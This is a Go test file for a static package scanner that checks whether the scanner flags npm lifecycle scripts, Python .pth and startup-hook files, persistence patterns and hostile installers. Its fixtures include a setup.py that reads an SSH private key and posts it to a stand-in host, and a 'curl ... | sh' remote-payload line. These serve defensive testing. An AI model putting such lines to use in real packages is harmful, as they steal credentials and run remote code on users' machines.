package lsec

import (
	"os"
	"path/filepath"
	"testing"
)

func TestStaticScannerFlagsNpmPostinstall(t *testing.T) {
	dir := t.TempDir()
	body := []byte(`{"scripts":{"postinstall":"node setup.js"}}`)
	if err := os.WriteFile(filepath.Join(dir, "package.json"), body, 0o600); err != nil {
		t.Fatal(err)
	}

	findings, err := StaticScan(dir)
	if err != nil {
		t.Fatal(err)
	}
	if !hasFinding(findings, "npm_lifecycle_script") {
		t.Fatalf("expected npm lifecycle finding, got %#v", findings)
	}
}

func TestStaticScannerPromptsOnNpmDependencyMetadata(t *testing.T) {
	dir := t.TempDir()
	body := []byte(`{"dependencies":{"left-pad":"1.3.0"}}`)
	if err := os.WriteFile(filepath.Join(dir, "package.json"), body, 0o600); err != nil {
		t.Fatal(err)
	}

	findings, err := StaticScan(dir)
	if err != nil {
		t.Fatal(err)
	}
	if !hasFinding(findings, "dependency_metadata_present") {
		t.Fatalf("expected dependency metadata finding, got %#v", findings)
	}
}

func TestStaticScannerDoesNotBlockWheelDependencyMetadata(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "pkg.dist-info")
	if err := os.MkdirAll(dir, 0o700); err != nil {
		t.Fatal(err)
	}
	body := []byte("Metadata-Version: 2.1\nName: pkg\nRequires-Dist: requests >=2\n")
	if err := os.WriteFile(filepath.Join(dir, "METADATA"), body, 0o600); err != nil {
		t.Fatal(err)
	}

	findings, err := StaticScan(filepath.Dir(dir))
	if err != nil {
		t.Fatal(err)
	}
	if hasFinding(findings, "dependency_metadata_present") {
		t.Fatalf("unexpected dependency metadata finding for wheel: %#v", findings)
	}
}

func TestStaticScannerBlocksCredentialNetworkCombo(t *testing.T) {
	dir := t.TempDir()
	source := []byte(`import requests, pathlib
data = pathlib.Path("/home/me/.ssh/id_rsa").read_text()
requests.post("https://evil.invalid", data=data)
`)
	if err := os.WriteFile(filepath.Join(dir, "setup.py"), source, 0o600); err != nil {
		t.Fatal(err)
	}

	findings, err := StaticScan(dir)
	if err != nil {
		t.Fatal(err)
	}
	if !hasFinding(findings, "credential_exfil_pattern") {
		t.Fatalf("expected credential exfil finding, got %#v", findings)
	}
}

func TestStaticScannerBlocksExecutablePTHFile(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "evil.pth"), []byte("import evil_bootstrap\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	findings, err := StaticScan(dir)
	if err != nil {
		t.Fatal(err)
	}
	if firstFindingSeverity(findings, "python_pth_execution") != "block" {
		t.Fatalf("expected blocking python_pth_execution finding, got %#v", findings)
	}
}

func TestStaticScannerBlocksPythonStartupHookFiles(t *testing.T) {
	for _, name := range []string{"sitecustomize.py", "usercustomize.py"} {
		t.Run(name, func(t *testing.T) {
			dir := t.TempDir()
			if err := os.WriteFile(filepath.Join(dir, name), []byte("print('startup')\n"), 0o600); err != nil {
				t.Fatal(err)
			}

			findings, err := StaticScan(dir)
			if err != nil {
				t.Fatal(err)
			}
			if firstFindingSeverity(findings, "python_startup_hook") != "block" {
				t.Fatalf("expected blocking python_startup_hook finding, got %#v", findings)
			}
		})
	}
}

func TestStaticScannerScansExtensionlessInstallerNames(t *testing.T) {
	dir := t.TempDir()
	source := []byte(`curl https://evil.invalid/payload | sh`)
	if err := os.WriteFile(filepath.Join(dir, "install"), source, 0o600); err != nil {
		t.Fatal(err)
	}

	findings, err := StaticScan(dir)
	if err != nil {
		t.Fatal(err)
	}
	if firstFindingSeverity(findings, "remote_shell_payload") != "block" {
		t.Fatalf("expected blocking remote_shell_payload for extensionless installer, got %#v", findings)
	}
}

func TestStaticScannerUsesSkillpackPersistencePatterns(t *testing.T) {
	dir := t.TempDir()
	source := []byte(`osascript -e 'display dialog "hi"'`)
	if err := os.WriteFile(filepath.Join(dir, "install"), source, 0o600); err != nil {
		t.Fatal(err)
	}

	findings, err := StaticScan(dir)
	if err != nil {
		t.Fatal(err)
	}
	if firstFindingSeverity(findings, "persistence_write_pattern") != "block" {
		t.Fatalf("expected blocking persistence_write_pattern from skillpack pattern, got %#v", findings)
	}
}

func hasFinding(findings []Finding, code string) bool {
	for _, finding := range findings {
		if finding.Code == code {
			return true
		}
	}
	return false
}
